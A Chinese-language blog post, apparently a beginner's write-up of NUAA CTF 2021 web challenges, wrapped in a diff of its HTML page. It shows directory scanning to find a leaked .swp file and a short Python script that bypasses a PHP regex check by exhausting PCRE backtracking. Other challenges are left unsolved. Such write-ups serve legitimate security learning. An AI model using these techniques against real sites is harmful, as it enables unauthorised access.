@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Sheep.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Sheep.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sheeprooo.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="NUAA CTF 2021 Web Write up第一场正式的的CTF比赛WP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NUAA CTF 2021 Web Write up">
+<meta property="og:url" content="https://sheeprooo.top/2021/04/10/NUAA%20CTF%202021%20WP/index.html">
+<meta property="og:site_name" content="sheeprooo&#39;s Blog">
+<meta property="og:description" content="NUAA CTF 2021 Web Write up第一场正式的的CTF比赛WP">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210328195900666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_20,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210328204502583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210328204551203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210328200950634.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210328204652570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210328201104698.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210328204722851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_32,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210328201752270.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210328201935905.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210328204809754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021032821021262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_32,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210328210244539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_48,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2021-04-10T12:23:04.000Z">
+<meta property="article:modified_time" content="2021-06-24T17:15:55.627Z">
+<meta property="article:author" content="sheeprooo">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210328195900666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_20,color_FFFFFF,t_70">
+
+<link rel="canonical" href="https://sheeprooo.top/2021/04/10/NUAA%20CTF%202021%20WP/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>NUAA CTF 2021 Web Write up | sheeprooo's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?780d906d7b36719fd29918ca0e980684";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">sheeprooo's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Hello World</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">9</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">6</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">14</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sheeprooo.top/2021/04/10/NUAA%20CTF%202021%20WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://z3.ax1x.com/2021/04/02/cehqlF.png">
+      <meta itemprop="name" content="sheeprooo">
+      <meta itemprop="description" content="千年暗室，一灯即明">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="sheeprooo's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          NUAA CTF 2021 Web Write up
+        </h1>
+
+        <div class="post-meta">
+		  
+		  
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-04-10 20:23:04" itemprop="dateCreated datePublished" datetime="2021-04-10T20:23:04+08:00">2021-04-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-06-25 01:15:55" itemprop="dateModified" datetime="2021-06-25T01:15:55+08:00">2021-06-25</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2021/04/10/NUAA%20CTF%202021%20WP/" class="post-meta-item leancloud_visitors" data-flag-title="NUAA CTF 2021 Web Write up" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="NUAA-CTF-2021-Web-Write-up"><a href="#NUAA-CTF-2021-Web-Write-up" class="headerlink" title="NUAA CTF 2021 Web Write up"></a>NUAA CTF 2021 Web Write up</h1><p>第一场正式的的CTF比赛WP</p>
+<span id="more"></span>
+
+<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>打开环境，查看网页源代码，即发现flag<br><img src="https://img-blog.csdnimg.cn/20210328195900666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_20,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="DDoSme"><a href="#DDoSme" class="headerlink" title="DDoSme"></a>DDoSme</h2><p>打开环境，提示Do you kNow .swp file? 直接百度，查到<br><img src="https://img-blog.csdnimg.cn/20210328204502583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>于是知道会要用到Linux<br>用dirsearch扫一下网站目录，发现了.index.php.swp文件</p>
+<p><img src="https://img-blog.csdnimg.cn/20210328204551203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>地址栏URL后面输入<code>.index.php.swp</code>下载swp文件<br>这个时候用notepad打开发现全是乱码，百度发现<br><img src="https://img-blog.csdnimg.cn/20210328200950634.png"></p>
+<p>于是复制到Linux虚拟机中，</p>
+<p><img src="https://img-blog.csdnimg.cn/20210328204652570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>再<br><img src="https://img-blog.csdnimg.cn/20210328201104698.png" alt="在这里插入图片描述"></p>
+<p>得到还原后的PHP文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">areyouok</span>(<span class="params"><span class="variable">$greeting</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/Baby.*PHP/is&#x27;</span>,<span class="variable">$greeting</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$greeting</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;greeting&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_array(<span class="variable">$greeting</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!areyouok(<span class="variable">$greeting</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$greeting</span>,<span class="string">&#x27;Baby PHP&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;flag&#123;xxxxxx&#125;&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Do you kNow .swp file?&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Do you know PHP?&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>emmm…PHP学的还不多，看不懂，果断度娘，发现……竟然跟18年i春秋圣诞欢乐赛题一样…原理就是pcre具有回溯上限，当回溯超过上限时返回 false，从而绕过正则匹配函数(虽然俺不懂，但俺会CV大法)<br>链接:<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/68f3c8e5d2b4">2018年i春秋圣诞欢乐赛Web WP</a><br>然后通过Python写个脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;greeting&#x27;</span>:(<span class="string">&#x27;Baby PHP&#x27;</span> + <span class="string">&#x27;a&#x27;</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&#x27;http://server.cooook.icu:10003/index.php&#x27;</span>, data=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+<p>运行之后，成功拿到flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20210328204722851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_32,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="easy-xss"><a href="#easy-xss" class="headerlink" title="easy_xss"></a>easy_xss</h2><p>看题目知道是xss跨站脚本漏洞攻击<br>题目要求是：<br><img src="https://img-blog.csdnimg.cn/20210328201752270.png" alt="在这里插入图片描述"><br>扫了下网站<br><img src="https://img-blog.csdnimg.cn/20210328201935905.png" alt="在这里插入图片描述"><br>看到了upload.php，试了一下emmm确实打不开<br>所以要登入管理员界面，xss攻击，想到了窃取cookie绕过登录，<br>而且正好点开Read sample post出现了管理员发表的文章</p>
+<p>然后..就卡住了(っ °Д °)っ<br><img src="https://img-blog.csdnimg.cn/20210328204809754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p><img src="https://img-blog.csdnimg.cn/2021032821021262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_32,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210328210244539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_48,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>emmm……PHP，Base64，这俩合一起….看了度娘都看不懂…毫无思路</p>
+<p>比完赛，感觉 我是废物（；´д｀）ゞ</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>sheeprooo
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://sheeprooo.top/2021/04/10/NUAA%20CTF%202021%20WP/" title="NUAA CTF 2021 Web Write up">https://sheeprooo.top/2021/04/10/NUAA CTF 2021 WP/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%A4%A7%E6%B3%95/" rel="prev" title="注册表大法">
+      <i class="fa fa-chevron-left"></i> 注册表大法
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/04/16/Web-wp/" rel="next" title="Web-wp">
+      Web-wp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#NUAA-CTF-2021-Web-Write-up"><span class="nav-number">1.</span> <span class="nav-text">NUAA CTF 2021 Web Write up</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="nav-number">1.1.</span> <span class="nav-text">签到题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DDoSme"><span class="nav-number">1.2.</span> <span class="nav-text">DDoSme</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-xss"><span class="nav-number">1.3.</span> <span class="nav-text">easy_xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#base64"><span class="nav-number">1.4.</span> <span class="nav-text">base64</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="sheeprooo"
+      src="https://z3.ax1x.com/2021/04/02/cehqlF.png">
+  <p class="site-author-name" itemprop="name">sheeprooo</p>
+  <div class="site-description" itemprop="description">千年暗室，一灯即明</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/sheeprooo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;sheeprooo" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:hairsheep@163.com" title="E-Mail → mailto:hairsheep@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sheeprooo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+<script>
+  (function() {
+    function leancloudSelector(url) {
+      url = encodeURI(url);
+      return document.getElementById(url).querySelector('.leancloud-visitors-count');
+    }
+
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = decodeURI(visitors.id);
+      var title = visitors.dataset.flagTitle;
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            leancloudSelector(url).innerText = counter.time + 1;
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .catch(error => {
+                console.error('Failed to save visitor count', error);
+              });
+          } else {
+              Counter('post', '/classes/Counter', { title, url, time: 1 })
+                .then(response => response.json())
+                .then(() => {
+                  leancloudSelector(url).innerText = 1;
+                })
+                .catch(error => {
+                  console.error('Failed to create', error);
+                });
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return decodeURI(element.id);
+      });
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url: { '$in': entries } })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          for (let url of entries) {
+            let target = results.find(item => item.url === url);
+            leancloudSelector(url).innerText = target ? target.time : 0;
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    let { app_id, app_key, server_url } = {"enable":true,"app_id":"ReTDgR5EU0PzDQwOxtIJNB7a-gzGzoHsz","app_key":"oDlU1pkFjSw0Uh2tH0imedqA","server_url":null,"security":false};
+    function fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${api_server}/1.1${url}`, {
+          method,
+          headers: {
+            'X-LC-Id'     : app_id,
+            'X-LC-Key'    : app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        if (CONFIG.hostname !== location.hostname) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    }
+
+    let api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${app_id.slice(0, 8).toLowerCase()}.api.lncldglobal.com`;
+
+    if (api_server) {
+      fetchData(api_server);
+    } else {
+      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
+        .then(response => response.json())
+        .then(({ api_server }) => {
+          fetchData('https://' + api_server);
+        });
+    }
+  })();
+</script>
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
+
+
+</body>
+</html>
